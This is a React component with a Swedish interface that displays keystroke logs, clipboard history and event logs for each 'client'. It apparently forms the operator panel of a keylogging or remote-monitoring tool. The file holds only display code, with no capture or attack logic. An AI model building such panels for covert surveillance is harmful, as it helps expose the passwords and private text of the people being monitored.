
import React, { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import { useQuery } from "@tanstack/react-query";
import { toast } from "sonner";
import { Loader2 } from "lucide-react";

interface LogsTabProps {
  client: any;
}

export function LogsTab({ client }: LogsTabProps) {
  const [sortOrder, setSortOrder] = useState("newest");

  // Fetch real logs from the API
  const { data: logs, isLoading, error } = useQuery({
    queryKey: ['clientLogs', client.id],
    queryFn: async () => {
      try {
        const response = await fetch(`/api/clients/${client.id}/logs`);
        if (!response.ok) {
          throw new Error(`Error fetching logs: ${response.status}`);
        }
        return await response.json();
      } catch (error) {
        console.error("Error fetching logs:", error);
        throw error;
      }
    },
    retry: 1,
    staleTime: 30000 // 30 seconds
  });

  // Initialize empty log data structure
  const emptyLogs = {
    keystrokes: [],
    clipboard: [],
    events: []
  };

  // Use real data or empty structure
  const logData = logs || emptyLogs;

  useEffect(() => {
    if (error) {
      toast.error("Kunde inte hämta loggar för klienten");
    }
  }, [error]);

  // Sort logs based on sortOrder
  const sortLogs = (logs: any[]) => {
    if (!logs || !Array.isArray(logs)) return [];
    
    return [...logs].sort((a, b) => {
      const dateA = new Date(a.timestamp).getTime();
      const dateB = new Date(b.timestamp).getTime();
      return sortOrder === "newest" ? dateB - dateA : dateA - dateB;
    });
  };

  // Function to format log content with line breaks
  const formatLogContent = (content: string) => {
    if (!content) return "";
    
    return content.split("[ENTER]").map((line, index, array) => (
      <React.Fragment key={index}>
        {line}
        {index < array.length - 1 && <br />}
      </React.Fragment>
    ));
  };

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h2 className="text-xl font-semibold">Loggar för {client.name}</h2>
        <div className="flex items-center gap-2">
          <Label htmlFor="sortOrder">Sortering:</Label>
          <Select value={sortOrder} onValueChange={setSortOrder}>
            <SelectTrigger className="w-[180px]">
              <SelectValue placeholder="Sorteringsordning" />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="newest">Nyaste först</SelectItem>
              <SelectItem value="oldest">Äldsta först</SelectItem>
            </SelectContent>
          </Select>
        </div>
      </div>

      {isLoading ? (
        <div className="flex justify-center items-center p-12">
          <Loader2 className="h-8 w-8 animate-spin mr-2" />
          <p>Laddar loggar...</p>
        </div>
      ) : (
        <Tabs defaultValue="keystrokes">
          <TabsList>
            <TabsTrigger value="keystrokes">Tangenttryckningar</TabsTrigger>
            <TabsTrigger value="clipboard">Urklipp</TabsTrigger>
            <TabsTrigger value="events">Händelser</TabsTrigger>
            <TabsTrigger value="all">Alla loggar</TabsTrigger>
          </TabsList>
          
          {/* Keystrokes Tab */}
          <TabsContent value="keystrokes">
            <Card>
              <CardHeader>
                <CardTitle>Tangenttryckningar</CardTitle>
                <CardDescription>
                  Text som användaren har skrivit
                </CardDescription>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[400px]">
                  <div className="space-y-4">
                    {sortLogs(logData.keystrokes).length === 0 ? (
                      <p className="text-muted-foreground text-center py-8">Inga tangenttryckningar loggade</p>
                    ) : (
                      sortLogs(logData.keystrokes).map((log) => (
                        <div key={log.id} className="p-4 border rounded-md">
                          <div className="flex justify-between mb-2">
                            <span className="text-sm font-medium">{client.name}</span>
                            <span className="text-sm text-muted-foreground">{log.timestamp}</span>
                          </div>
                          <div className="bg-muted p-3 rounded font-mono text-sm whitespace-pre-wrap">
                            {formatLogContent(log.content)}
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
          
          {/* Clipboard Tab */}
          <TabsContent value="clipboard">
            <Card>
              <CardHeader>
                <CardTitle>Urklippshistorik</CardTitle>
                <CardDescription>
                  Text som kopierats till urklipp
                </CardDescription>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[400px]">
                  <div className="space-y-4">
                    {sortLogs(logData.clipboard).length === 0 ? (
                      <p className="text-muted-foreground text-center py-8">Ingen urklippshistorik loggad</p>
                    ) : (
                      sortLogs(logData.clipboard).map((log) => (
                        <div key={log.id} className="p-4 border rounded-md">
                          <div className="flex justify-between mb-2">
                            <span className="text-sm font-medium">{client.name}</span>
                            <span className="text-sm text-muted-foreground">{log.timestamp}</span>
                          </div>
                          <div className="bg-muted p-3 rounded font-mono text-sm whitespace-pre-wrap">
                            {log.content}
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
          
          {/* Events Tab */}
          <TabsContent value="events">
            <Card>
              <CardHeader>
                <CardTitle>Systemhändelser</CardTitle>
                <CardDescription>
                  Händelser och statusuppdateringar
                </CardDescription>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[400px]">
                  <div className="space-y-4">
                    {sortLogs(logData.events).length === 0 ? (
                      <p className="text-muted-foreground text-center py-8">Inga händelser loggade</p>
                    ) : (
                      sortLogs(logData.events).map((log) => (
                        <div key={log.id} className="p-4 border rounded-md">
                          <div className="flex justify-between mb-2">
                            <span className="text-sm font-medium">{client.name}</span>
                            <span className="text-sm text-muted-foreground">{log.timestamp}</span>
                          </div>
                          <div className="bg-blue-50 text-blue-800 dark:bg-blue-950 dark:text-blue-200 p-3 rounded text-sm">
                            {log.content}
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
          
          {/* All Logs Tab */}
          <TabsContent value="all">
            <Card>
              <CardHeader>
                <CardTitle>Alla loggar</CardTitle>
                <CardDescription>
                  Kombinerad vy av alla loggtyper
                </CardDescription>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[400px]">
                  <div className="space-y-4">
                    {(() => {
                      const allLogs = [
                        ...(logData.keystrokes || []).map(log => ({ ...log, type: 'keystrokes' })),
                        ...(logData.clipboard || []).map(log => ({ ...log, type: 'clipboard' })),
                        ...(logData.events || []).map(log => ({ ...log, type: 'events' }))
                      ];
                      
                      const sortedLogs = sortLogs(allLogs);
                      
                      return sortedLogs.length === 0 ? (
                        <p className="text-muted-foreground text-center py-8">Inga loggar hittades</p>
                      ) : (
                        sortedLogs.map((log, index) => (
                          <div key={`${log.type}-${log.id}`} className="p-4 border rounded-md">
                            <div className="flex justify-between mb-2">
                              <div className="flex items-center gap-2">
                                <span className="text-sm font-medium">{client.name}</span>
                                <span className="text-xs px-2 py-0.5 rounded-full bg-muted">
                                  {log.type === 'keystrokes' ? 'Tangenttryck' : 
                                   log.type === 'clipboard' ? 'Urklipp' : 'Händelse'}
                                </span>
                              </div>
                              <span className="text-sm text-muted-foreground">{log.timestamp}</span>
                            </div>
                            <div className={`p-3 rounded text-sm ${
                              log.type === 'events' ? 'bg-blue-50 text-blue-800 dark:bg-blue-950 dark:text-blue-200' : 
                              'bg-muted font-mono whitespace-pre-wrap'
                            }`}>
                              {log.type === 'keystrokes' ? formatLogContent(log.content) : log.content}
                            </div>
                          </div>
                        ))
                      );
                    })()}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      )}
    </div>
  );
}
